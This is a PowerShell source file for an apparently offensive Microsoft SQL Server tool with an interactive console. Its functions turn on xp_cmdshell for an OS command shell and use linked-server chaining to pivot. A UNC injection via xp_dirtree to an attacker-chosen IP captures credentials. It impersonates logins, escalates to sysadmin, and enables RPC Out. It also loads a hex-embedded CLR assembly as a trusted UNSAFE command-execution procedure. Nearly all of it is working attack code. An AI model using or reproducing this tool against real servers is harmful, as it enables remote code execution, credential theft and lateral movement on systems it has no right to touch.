class MSSQLReader {
    [System.Collections.ArrayList]$Names
    [System.Collections.ArrayList]$Values

    MSSQLReader([System.Data.SqlClient.SqlConnection]$client, [string]$query) {
        $this.Names = New-Object System.Collections.ArrayList
        $this.Values = New-Object System.Collections.ArrayList

        $command = $client.CreateCommand()
        $command.CommandText = $query
        $reader = $null
        $open = $false
        try {
            $reader = $command.ExecuteReader()
            $open = $true
            $j = 0
            while ($reader.Read()) {
                if ($j -eq 0) {
                    for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                        $this.Names.Add($reader.GetName($i).ToString())
                    }
                }
                $value = New-Object System.Collections.ArrayList
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $value.Add($reader.GetValue($i).ToString())
                }
                $this.Values.Add($value)
                $j += 1
            }
        } catch {
            Write-Host "Exception: $($_.Exception.Message)"
            $this.Names = $null
            $this.Values = $null
        } finally {
            if ($open -and $reader.get_IsClosed() -eq $false) {
                # Write-Host "MSSQLReader Dispose Worked"
                $reader.Close()
                $reader = $null
            }
        }
    }

    [System.Collections.ArrayList] GetNames() {
        # Write-Host "MSSQLReader Names called"
        return $this.Names
    }
    
    [System.Collections.ArrayList] GetValues() {
        # Write-Host "MSSQLReader Values called"
        return $this.Values
    }
}

class MSSQLClient {
    [System.Data.SqlClient.SqlConnection]$con = $null
    [System.Collections.ArrayList]$remoteHosts = $null

    MSSQLClient([string]$sqlServer, [string]$database) {
        $conString = "Server=$sqlServer;Database=$database;Integrated Security=True;"
        $this.Connect($conString, $sqlServer)
    }

    MSSQLClient([string]$sqlServer, [string]$database, [string]$userID = $null, [string]$password = $null) {
        $conString = "Server=$sqlServer;Database=$database;User ID=$userID;Password=$password;"
        $this.Connect($conString, $sqlServer)
    }

    [void] Connect([string]$conString, [string]$sqlServer) {
        $this.con = New-Object System.Data.SqlClient.SqlConnection($conString)
        $this.remoteHosts = New-Object System.Collections.ArrayList
        $this.remoteHosts.Add($sqlServer) | Out-Null
        try {
            $this.con.Open()
        } catch {
            throw "Exception: $($_.Exception.Message)"
        }
    }

    [void] PrintHosts() {
        foreach ($remote in $this.remoteHosts) {
            Write-Host "[$remote]-" -NoNewLine
        }
    }

    [void] Close() {
        if ($this.con -ne $null) {
            # Write-Host "MSSQLClient Dispose Worked"
            $this.con.Close()
            $this.con = $null
        }
    }

    [void] PushHost([string]$remote) {
        $this.remoteHosts.Add($remote) | Out-Null
    }

    [void] PopHost() {
        $this.remoteHosts.removeAt($this.remoteHosts.Count - 1)
    }

    [System.Array] Execute([string]$query) {
        $names = $null
        $values = $null
        $reader = $null

        for ($i = $this.remoteHosts.Count - 1; $i -ge 1; $i--) {
            $query = $query -replace "'", "''"
            $query = 'exec (''' + $query + ''') at [' + $this.remoteHosts[$i] + ']'
            # $query = 'select 1 from openquery("' + $this.remoteHosts[$i] + '", ''' + $query + ''''
        }
        # Write-Host $query

        $reader = New-Object MSSQLReader($this.con, $query)
        $names = $reader.GetNames()
        $values = $reader.GetValues()

        return $names, $values
    }
}

function XP_CMDShell {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [MSSQLClient]$client
    )
    $client.Execute('sp_configure ''show advanced options'', 1; reconfigure; exec sp_configure ''xp_cmdshell'', 1; reconfigure;')
    while ($true) {
        $client.PrintHosts()
        Write-Host "XP_CMDSHELL> " -NoNewLine
        $command = $Host.UI.ReadLine()

        if ($command -Match "\A *exit *\z" -Or $command -Match "\A *quit *\z") {
            break
        }

        $command = $command -replace '"', '""'
        $command = 'exec xp_cmdshell "' + $command + '"'
        $result = $client.Execute($command)

        if ($result[0] -eq $null) {
            continue
        }

        foreach ($records in $result[1]) {
            foreach ($value in $records) {
                Write-Host $value
            }
        }
    }
}

function Enumeration {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [MSSQLClient]$client
    )
    $systemUser = $client.Execute("select system_user;")[1][0]
    $databaseUser = $client.Execute("select user_name();")[1][0]
    $isPublic = $client.Execute("select is_srvrolemember('public');")[1][0]
    $isSysAdmin = $client.Execute("select is_srvrolemember('sysadmin');")[1][0]
    $impersonateUsers = $client.Execute("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';")[1]
    $linkedServers = $client.Execute("EXEC sp_linkedservers;")[1]
    Write-Host "System User: $systemUser"
    Write-Host "Database User: $databaseUser"
    if ($isPublic -eq 1) {
        Write-Host "$systemUser is a member of public role"
    } else {
        Write-Host "$systemUser is NOT a member of public role"
    }
    if ($isSysAdmin -eq 1) {
        Write-Host "$systemUser is a member of sysadmin role"
    } else {
        Write-Host "$systemUser is NOT a member of sysadmin role"
    }
    Write-Host "Logins that can be impersonated:"
    foreach ($user in $impersonateUsers) {
        Write-Host $user
    }
    Write-Host ""
    Write-Host "Linked SQL Servers:"
    foreach ($server in $linkedServers) {
        Write-Host $server
    }
}

function UncInjection {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [MSSQLClient]$client,
        [Parameter(Position = 1, Mandatory = $True)] [string]$ipAddress
    )

    # $command = 'EXEC master..xp_dirtree "\\' + $ipAddress + '\test";'
    $command = "EXEC master..xp_dirtree ""\\${ipAddress}\test""";
    Write-Host 'Executing' $command
    $client.Execute($command)
}

function ImpersonateUser {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [MSSQLClient]$client,
        [Parameter(Position = 1, Mandatory = $True)] [string]$user
    )
    $command = "execute as login = '${user}';"
    $client.Execute($command)
}

function SysAdmin {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [MSSQLClient]$client
    )
    $command = "use msdb; EXECUTE AS USER = 'dbo';"
    $client.Execute($command)
}

function EnableRPC {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [MSSQLClient]$client,
        [Parameter(Position = 1, Mandatory = $True)] [string]$sqlServer
    )
    $command = "EXEC sp_serveroption '${sqlServer}', 'RPC Out', 'True';"
    $client.Execute($command)
}

function AssemblyShell {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [MSSQLClient]$client
    )
    $setting = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;"
    $assembly = "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005045000064860200A9C9C2890000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000068030000000000000000000000000000000000000000000000000000E4290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000820A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000D0080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000F403000023537472696E67730000000018070000580000002355530070070000100000002347554944000000800700005001000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000640201000000000006008E0113030600FB0113030600AC00E1020F00330300000600D40077020600710177020600520177020600E20177020600AE0177020600C70177020600010177020600C000F40206009E00F40206003501770206001C012D020600850370020A00EB00C0020A00470242030E006803E1020A006200C0020E009702E10206005D0270020A002000C0020A008E0014000A00D703C0020A008600C0020600A8020A000600B5020A000000000001000000000001000100010010005703000041000100010048200000000096003500620001000921000000008618DB02060002000000010056000900DB0201001100DB0206001900DB020A002900DB0210003100DB0210003900DB0210004100DB0210004900DB0210005100DB0210005900DB0210006100DB0215006900DB0210007100DB0210007900DB0210008900DB0206009900DB020600990089022100A90070001000B1007E032600A90070031000A90019021500A900BC0315009900A3032C00B900DB023000A100DB023800C9007D003F00D100980344009900A9034A00E1003D004F00810051024F00A1005A025300D100E2034400D1004700060099008C0306009900980006008100DB02060020007B0049012E000B0068002E00130071002E001B0090002E00230099002E002B00A6002E003300A6002E003B00A6002E00430099002E004B00AC002E005300A6002E005B00A6002E006300C4002E006B00EE002E007300FB001A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007002000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700636D64457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F007500740070007500740000004C778AA48C0AF34EB6CEF7654A48A35100042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000C010007636D6445786563000005010000000017010012436F7079726967687420C2A920203230323400002901002464663535326633302D396431352D346137332D393461332D37326564373063636534343100000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000006F04AFB30000000002000000660000001C2A00001C0C000000000000000000000000000010000000000000000000000000000000525344534FF0F7B5B0ABD94DA297CC9EEABBAC35010000005C5C3139322E3136382E34352E3234305C76697375616C73747564696F5C436F6E736F6C65417070315C636D64457865635C6F626A5C7836345C52656C656173655C636D64457865632E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000380008000100460069006C0065004400650073006300720069007000740069006F006E000000000063006D00640045007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000063006D00640045007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200340000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006D00640045007800650063002E0064006C006C000000300008000100500072006F0064007500630074004E0061006D0065000000000063006D00640045007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    $addTrust = "exec sp_add_trusted_assembly 0x5048e0cbde9456392db99fccd93812a0bdaac78f137dd49a80337ed5ae72213972a390593b248d57daab165256989296ee46b552b6ec6b2c35dd16fb914abf30, N'myAssembly';"
    $shell = "CREATE ASSEMBLY myAssembly FROM $assembly WITH PERMISSION_SET = UNSAFE;"
    $proc = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];"
    $client.Execute($setting)
    $client.Execute($addTrust)
    $client.Execute($shell)
    $client.Execute($proc)
    while ($true) {
        $client.PrintHosts()
        Write-Host "ASSEMBLY_SHELL> " -NoNewLine
        $command = $Host.UI.ReadLine()

        if ($command -Match "\A *exit *\z" -Or $command -Match "\A *quit *\z") {
            break
        }

        $command = $command -replace '"', '""' 
        $result = $client.Execute('exec cmdExec "' + $command + '"')

        if ($result[0] -eq $null) {
            continue
        }

        foreach ($records in $result[1]) {
            foreach ($value in $records) {
                Write-Host $value
            }
        }
    }
}

function SQLQuery {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [MSSQLClient]$client,
        [Parameter(Position = 1, Mandatory = $True)][AllowEmptyString()] [string]$query
    )

    try {
        $result = $client.Execute($query)
    } catch {
        Write-Host "Exception: $($_.Exception.Message)"
        return
    }
    if ($result[0] -eq $null) {
        continue
    }

    $names = $result[0] -Join ' | '
    Write-Host $names
    foreach ($rows in $result[1]) {
        $line = $rows -Join ' | '
        Write-Host $line
    }
}

function MSSQLConnection {
    param(
        [Parameter(Position = 0, Mandatory = $True)] [string]$sqlServer,
        [Parameter(Position = 1, Mandatory = $False)] [string]$database = "master",
        [Parameter(Position = 2, Mandatory = $False)] $username = $null,
        [Parameter(Position = 3, Mandatory = $False)] $password = $null
    )
    $client = $null
    try {
        if ($username -ne $null -and $password -ne $null) {
            $client = [MSSQLClient]::new($sqlServer, $database, $username, $password)
        } elseif ($username -ne $null -or $password -ne $null) {
            Write-Host "Password required if you want to login with SQL Server authentication."
            return
        } else {
            $client = [MSSQLClient]::new($sqlServer, $database)
        }

        while ($true) {
            $client.PrintHosts()
            Write-Host "> " -NoNewLine
            $query = $Host.UI.ReadLine()
            if ($query -Match "\A *exit *\z" -Or $query -Match "\A *quit *\z") {
                break
            }

            if ($query -Match "\Apush") {
                $remote = $query -replace "\Apush *", ""
                $client.PushHost($remote)
                continue
            }

            if ($query -Match "\Apop *") {
                if ($client.remoteHosts.Count -eq 1) {
                    Write-Host 'you type "exit" and can disconnect'
                    continue
                }
                $client.PopHost()
                continue
            }

            if ($query -Match "\Ashell *\z") {
                XP_CMDSHELL $client
                Write-Host "Shell mode end."
                continue
            }

            if ($query -Match "\Aashell *\z") {
                AssemblyShell $client
                Write-Host "Assembly Shell mode end."
                continue
            }

            if ($query -Match "\Aenum *\z") {
                Enumeration $client
                Write-Host "----"
                Write-Host "Enumeration finished!"
                continue
            }

            if ($query -Match "\A *uncinjection *") {
                $argument = $query -replace "\A *uncinjection *", ""
                if (-Not ($argument -Match "(\d{1,3}\.){3}\d{1,3} *\z")) {
                    Write-Host "Usage: uncinjection <IP ADDRESS>"
                    continue
                }
                $ipAddress = $argument -replace ' *\z', ''
                UncInjection $client $ipAddress
                Write-Host "Unc Injection finished!"
                continue
            }

            if ($query -Match "\Aimpersonate *") {
                $argument = $query -replace "\Aimpersonate *", ""
                $user = $argument -replace ' *\z', ''
                ImpersonateUser $client $user
                Write-Host "Impersonation finished!"
                continue
            }

            if ($query -Match "\Asysadmin *") {
                SysAdmin $client
                $systemUser = $client.Execute("select system_user;")[1][0]
                $databaseUser = $client.Execute("select user_name();")[1][0]
                Write-Host "System User: ${systemUser}"
                Write-Host "Database User: ${databaseUser}"
                continue
            }

            if ($query -Match "\Aenablerpc *") {
                $argument = $query -replace "\Aenablerpc *", ""
                $sqlServer = $argument -replace ' *\z', ''
                if ($sqlServer -eq '') {
                    Write-Host "Usage: enablerpc <SQL SERVER>"
                    continue
                }
                Write-Host "Enabling RPC on ${sqlServer} ..."
                EnableRPC $client $sqlServer
                Write-Host "Execution finished!"
                continue
            }

            SQLQuery $client $query
        }
    } catch {
        Write-Host "Exception: $($_.Exception.Message)"
    } finally {
        if ($client -ne $null) {
            $client.Close()
        }
        Write-Host 'Connection closed!'
    }
}
